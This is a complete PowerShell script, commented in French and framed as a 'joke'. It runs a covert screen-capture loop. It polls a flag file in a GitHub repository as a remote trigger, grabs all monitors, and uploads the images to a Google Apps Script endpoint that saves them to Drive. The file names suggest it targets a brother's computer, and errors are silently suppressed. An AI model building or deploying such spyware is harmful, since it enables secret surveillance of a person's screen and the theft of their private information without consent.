# blague_screenshot_windows.ps1
# Surveille GitHub. Quand take_screenshot=true -> capture l'ecran -> envoie au Apps Script -> Drive.

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$ConfigFile = Join-Path $PSScriptRoot "blague_config.json"
$config     = Get-Content $ConfigFile -Raw | ConvertFrom-Json

$headers = @{
    Authorization = "Bearer $($config.token)"
    Accept        = "application/vnd.github+json"
    "User-Agent"  = "PowerShell"
}

function Get-ScreenshotSignal {
    try {
        $url  = "https://api.github.com/repos/$($config.owner)/$($config.repo)/contents/data/blague_screenshot.json?ref=$($config.branch)"
        $resp = Invoke-RestMethod -Uri $url -Headers $headers -ErrorAction Stop
        $json = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($resp.content -replace "\s","")))
        $data = $json | ConvertFrom-Json
        return @{ take_screenshot = [bool]$data.take_screenshot; sha = $resp.sha }
    } catch { return $null }
}

function Reset-ScreenshotSignal($sha) {
    try {
        $body = @{
            message = "reset screenshot signal"
            content = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('{"take_screenshot":false}'))
            sha     = $sha
            branch  = $config.branch
        } | ConvertTo-Json
        $url = "https://api.github.com/repos/$($config.owner)/$($config.repo)/contents/data/blague_screenshot.json"
        Invoke-RestMethod -Uri $url -Method Put -Headers $headers -Body $body -ContentType "application/json" | Out-Null
    } catch {}
}

function Send-Screenshot {
    $filename = "screen_frere_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').png"
    $tempPath = Join-Path $env:TEMP $filename

    # Capture tous les ecrans
    $bounds = [System.Windows.Forms.Screen]::AllScreens |
              ForEach-Object { $_.Bounds } |
              Measure-Object -Property Width -Sum
    $totalW = ($bounds | Select-Object -ExpandProperty Sum)
    $totalH = ([System.Windows.Forms.Screen]::AllScreens | Measure-Object -Property { $_.Bounds.Height } -Maximum).Maximum

    $left = ([System.Windows.Forms.Screen]::AllScreens | Measure-Object -Property { $_.Bounds.Left } -Minimum).Minimum
    $top  = ([System.Windows.Forms.Screen]::AllScreens | Measure-Object -Property { $_.Bounds.Top }  -Minimum).Minimum

    $bitmap   = New-Object System.Drawing.Bitmap($totalW, $totalH)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($left, $top, 0, 0, $bitmap.Size)
    $bitmap.Save($tempPath, [System.Drawing.Imaging.ImageFormat]::Png)
    $graphics.Dispose()
    $bitmap.Dispose()

    # Envoi au Apps Script Web App -> Google Drive
    try {
        $bytes = [IO.File]::ReadAllBytes($tempPath)
        $b64   = [Convert]::ToBase64String($bytes)
        $body  = @{ type = 'screenshot'; image = $b64; filename = $filename } | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri $config.webapp_url -Method Post -Body $body -ContentType "application/json" | Out-Null
    } catch {}

    Remove-Item $tempPath -ErrorAction SilentlyContinue
}

# Boucle principale
while ($true) {
    $signal = Get-ScreenshotSignal
    if ($signal -and $signal.take_screenshot) {
        Reset-ScreenshotSignal $signal.sha
        Send-Screenshot
    }
    Start-Sleep -Seconds 3
}
